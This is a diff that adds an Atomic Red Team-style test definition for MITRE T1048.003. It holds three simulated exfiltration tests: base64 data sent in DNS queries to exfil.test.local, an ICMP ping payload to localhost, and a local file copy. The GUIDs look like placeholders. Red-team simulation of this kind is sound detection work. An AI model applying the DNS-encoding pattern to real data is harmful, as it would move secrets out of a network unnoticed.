@@ -1,0 +1,51 @@
+attack_technique: T1048.003
+display_name: "Exfiltration Over Alternative Protocol: Unencrypted/Obfuscated Non-C2 Protocol"
+tactic: Exfiltration
+atomic_tests:
+  - name: "DNS Exfiltration Simulation"
+    auto_generated_guid: e5e5f5a6b6c6d6e6f6a7b7c7d7e7f7a8
+    description: |
+      Simulates DNS-based data exfiltration by encoding data in DNS queries.
+    supported_platforms:
+      - windows
+    executor:
+      name: powershell
+      command: |
+        $data = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes("AtomicRedTeam-ExfilTest"))
+        $encoded = $data -replace '[+/=]',''
+        Write-Output "Simulated DNS exfil query: $encoded.exfil.test.local"
+        Resolve-DnsName "$encoded.exfil.test.local" -ErrorAction SilentlyContinue 2>$null
+        Write-Output "DNS exfiltration simulation complete"
+      elevation_required: false
+
+  - name: "ICMP Exfiltration Simulation"
+    auto_generated_guid: f6f6a7b7c7d7e7f7a8b8c8d8e8f8a9b9
+    description: |
+      Simulates data exfiltration via ICMP ping payload.
+    supported_platforms:
+      - windows
+    executor:
+      name: powershell
+      command: |
+        $data = [Text.Encoding]::UTF8.GetBytes("AtomicRedTeam-ICMPExfil")
+        $ping = New-Object System.Net.NetworkInformation.Ping
+        try { $ping.Send("127.0.0.1", 1000, $data); Write-Output "ICMP exfil simulation: Sent $($data.Length) bytes" }
+        catch { Write-Output "ICMP exfil: $($_.Exception.Message)" }
+      elevation_required: false
+
+  - name: "SMB Exfiltration to Temp Share"
+    auto_generated_guid: a7a7b7c7d7e7f7a8b8c8d8e8f8a9b9c9
+    description: |
+      Simulates data exfiltration by copying to a network share.
+    supported_platforms:
+      - windows
+    executor:
+      name: command_prompt
+      command: |
+        echo AtomicRedTeam Exfiltration Test Data > %TEMP%\exfil_test.txt
+        echo Simulating copy to network share...
+        copy %TEMP%\exfil_test.txt %TEMP%\exfil_target.txt
+      cleanup_command: |
+        del /f %TEMP%\exfil_test.txt >nul 2>&1
+        del /f %TEMP%\exfil_target.txt >nul 2>&1
+      elevation_required: false
